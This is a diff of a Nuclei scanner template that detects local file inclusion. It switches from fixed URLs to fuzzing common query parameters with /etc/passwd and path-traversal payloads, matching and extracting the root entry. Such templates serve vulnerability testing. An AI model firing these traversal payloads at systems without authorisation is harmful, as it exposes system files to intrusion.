@@ -1,19 +1,34 @@
 id: THENAWABX_FOUND_LFI
 info:
-  name: 📂 Nawab-Confirmed-LFI 📂
+  name: Nawab-Confirmed-LFI
   author: thenawabx
   severity: critical
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}?file=/etc/passwd"
-      - "{{BaseURL}}?page=/etc/passwd"
-      - "{{BaseURL}}?path=/etc/passwd"
-      - "{{BaseURL}}?file=../../../../../../../../etc/passwd"
-      - "{{BaseURL}}?page=../../../../../../../../etc/passwd"
-      - "{{BaseURL}}?path=../../../../../../../../etc/passwd"
-      - "{{BaseURL}}?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+  - pre-condition:
+      - expr: "queue.has_params"
+
+    payloads:
+      lfi_payloads:
+        - "/etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        keys:
+          - "file"
+          - "page"
+          - "path"
+          - "doc"
+          - "folder"
+          - "lang"
+          - "view"
+          - "src"
+        fuzz:
+          - "{{lfi_payloads}}"
 
     stop-at-first-match: true
     matchers-condition: and
@@ -25,7 +40,7 @@ http:
       - type: regex
         part: body
         regex:
-          - "root:x:0:0:"
+          - "^root:x:0:0:"
 
       - type: word
         part: body
@@ -36,9 +51,12 @@ http:
           - "placeholder"
           - "syntax"
           - "W3Schools"
+          - "how to"
+          - "learning"
+        condition: or
 
     extractors:
       - type: regex
         part: body
         regex:
-          - "root:x:0:0:[^:]+:[^:]+:[^:]+"
+          - "root:x:0:0:[^:\n]+:[^:\n]+:[^:\n]+"
